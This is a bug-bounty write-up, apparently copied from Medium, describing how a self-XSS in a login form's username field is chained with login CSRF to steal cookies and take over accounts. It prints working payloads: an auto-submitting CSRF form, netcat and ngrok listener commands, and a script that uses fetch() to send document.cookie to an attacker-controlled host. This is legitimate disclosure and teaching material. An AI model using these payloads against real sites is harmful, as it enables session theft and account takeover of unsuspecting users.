---
description: >-
  source:
  https://melguerdawi.medium.com/from-self-xss-to-account-take-over-ato-812c194b61cf
---

# From Self XSS to Account Take Over(ATO)

<figure><img src="https://miro.medium.com/v2/resize:fit:388/1*Wfb593bpG6-Ywg9xi_XX2w.jpeg" alt="" height="162" width="310"><figcaption></figcaption></figure>

Hello there ,

I’m Mostafa Elguerdawi, Today , I would like to share about one of my recent finding in&#x20;

[HackerOne](https://medium.com/u/6f816e37be2c?source=post\_page-----812c194b61cf--------------------------------) ‘s program

Let’s say : https://[reacted.com](https://reacted.com/)

When I’m testing on this site, there is a login function, as normal I tried login bypass using Response Manipulation, Default Credentials, and SQL Injection.

but nothing work, I decided to examine the source code and found of the username that I entered a little while ago printed inside the value attribute.

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*h5P8coYMD8zy71DBlA4rqg.png" alt="" height="110" width="700"><figcaption></figcaption></figure>

I thought about trying an XSS injection so, I attempted to inject a double quote(“) within the username, I found that there is no filtering on it.

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*DRg51_UYIKs84aEtqO_nog.png" alt="" height="109" width="700"><figcaption></figcaption></figure>

So, I thought about injecting ‘<’, which might also work.

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*4tK6n3YnAISGqvVCK5AEtg.png" alt="" height="101" width="700"><figcaption></figcaption></figure>

Indeed, it worked!

So, I attempted to injecting a complete payload :

```
"> <svg/onload=alert("XSS")>
```

And it also succeeded!

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*28mX7_zTvPpuWcYAgA9Taw.png" alt="" height="144" width="700"><figcaption></figcaption></figure>

Unfortunately, this is a self-XSS

## Escalation phase <a href="#446d" id="446d"></a>

I ran my Burp Suite and intercepted the request during the login attempt.

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*T9NA0WqKk8YOFYpDqmioaQ.png" alt="" height="673" width="700"><figcaption></figcaption></figure>

From the request, I noticed that there is no protection against CSRF, which is expected from a login function.

I attempted to escalate the self-XSS to reflected XSS using CSRF.

The payload used :

```
<html>
  <body>
     <form name='myForm' id='myForm' method="POST" action="https://reacted.com/authenticate">
        <input type="hidden" name="loginName" value="&#x22;&#x20;><svg/onmouseover=alert(1)&#x20;&#x22;>   
        <input type="hidden" name="loginPassword" value="test"/>
        <input name="loginForm" class="btn btn-success" type="submit" value="Log in"/>
                </form>
        <script>
           document.addEventListener('DOMContentLoaded', function(event) {
            document.createElement('form').submit.call(document.getElementById('myForm'));
            });
        </script>       
  </body>
<html>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*9tCKYGM8ADDNtWvltqizYQ.png" alt="" height="244" width="700"><figcaption></figcaption></figure>

Yes, it worked!

with the help of ngrok, I managed to obtain anyone’s cookies

I opened two terminal tabs

first : ngrok http 80

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*hS9KVJcKrU5P3nJa3Nul4g.png" alt="" height="219" width="700"><figcaption></figcaption></figure>

second : sudo nc -nlvp 80

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*7BNnxG7qGkxvIpAWo_eBAg.png" alt="" height="134" width="700"><figcaption></figcaption></figure>

I used this payload in username :

> _\&#x22;\&#x20;> \<script>\&#x0a;fetch(‘https://\<ngrok-Domain>', { method: ‘POST’, mode: ‘no-cors’, body:document.cookie });\&#x0a;\</script>\&#x20;\&#x22;_

_\&#x22;\&#x20; : is a double quote and white space encoded in html_

This payload retrieves the user’s cookies and sends them to me. With the help of netcat(nc), I can obtain these cookies.

final payload :

```
<html>
 <body>
  <form name='myForm' id='myForm' method="POST" action="https://reacted.com/authenticate">
   <input type="hidden" name="loginName" value="&#x22;&#x20;> <script>&#x0a;fetch('https://<ngrok-host>', { method: 'POST', mode: 'no-cors', body:document.cookie });&#x0a;</script>&#x20;&#x22;"/>
   <input type="hidden" name="loginPassword" value="test"/>
   <input name="loginForm" class="btn btn-success" type="submit" value="Log in"/>
  </form>
  <script>
   document.addEventListener('DOMContentLoaded', function(event) {
    document.createElement('form').submit.call(document.getElementById('myForm'));
    });
  </script>
 </body>
<html>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*fm0K9T7mLZYzBEVt9_DxbQ.png" alt="" height="169" width="700"><figcaption></figcaption></figure>

Finally, I managed to obtain the cookies.
